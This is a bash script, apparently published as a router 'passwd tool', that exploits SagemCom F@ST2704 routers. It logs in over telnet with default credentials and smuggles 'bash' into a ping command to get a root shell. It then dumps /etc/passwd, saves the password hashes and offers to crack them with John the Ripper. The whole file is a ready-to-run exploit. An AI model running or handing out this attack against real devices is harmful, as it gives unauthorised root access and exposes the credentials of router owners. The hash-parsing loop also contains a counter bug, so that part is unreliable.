#!/bin/bash
#	~Mixbo
#	https://github.com/Mixbo/FaST2704/
#	www.wakowakowako.com

function haveProg() {
    [ -x "$(sudo which $1)" ]
}

function main()
{
	echo "[+] Launching SagemCom F@ST2704 passwd Tool"
	if haveProg expect; then
	
		logfile="hashes.log"
		hashfile="hashes.txt"

		if [ -z "$1" ]
		  then
		    host="192.168.1.1"
		  else
		  	host=$1
		fi

		echo "[+] Connecting to host $host"


		(expect -c "
			set timeout 20
			spawn telnet $host
			expect \"Login:\"
			send \"user\r\"
			expect \"Password:\"
			send \"user\r\"
			expect \">\"
			send \"ping -c 1 127.0.0.1;bash\n\"
			expect \"#\"
			send \"cat /etc/passwd\n\"
			expect \"#\"
			exit
		") > $logfile
		echo "[+] Saved session in $logfile"

		parse

		
		if haveProg john; then
			read -p "[+] Do you want to feed the hashes to John the Ripper? [y/*] " choice
			case $choice in
				[Yy]* )
					echo -e "[+] Starting John the Ripper to crack $hashfile\n\n"
					sudo john $hashfile
					echo -e "\n\n"
					sudo john $hashfile --show

			esac
		else
			echo "[-] John the Ripper is not installed."
			install john
		fi
	else
		echo "[-] expect is not installed.";
		install expect
	fi
}

function install()
{
	if haveProg apt-get ; then 
		echo "[+] You can install it with:	sudo apt-get install $1"
	elif haveProg yum ; then 
		echo "[+] You can install it with:	sudo yum install $1"
	elif haveProg port ; then 
		echo "[+] You can install it with:	sudo port install $1"
	elif haveProg pacman ; then 
		echo "[+] You can install it with:	sudo pacman -S $1"
	fi

	echo "[+] Closing..."
	exit
}

function parse()
{
	echo "[+] Parsing hashes"
	cat $logfile | while read line; do
		if [[ $i -eq 20 ]]; then
			echo $line > $hashfile
		else
			if [[ $i -gt 20 ]]; then
				echo $line >> $hashfile
			fi
		fi
		i=$i+1
	done
	echo "[+] Hashes saved in $hashfile !"
}
main $1
echo "[+] Closing program..."
exit

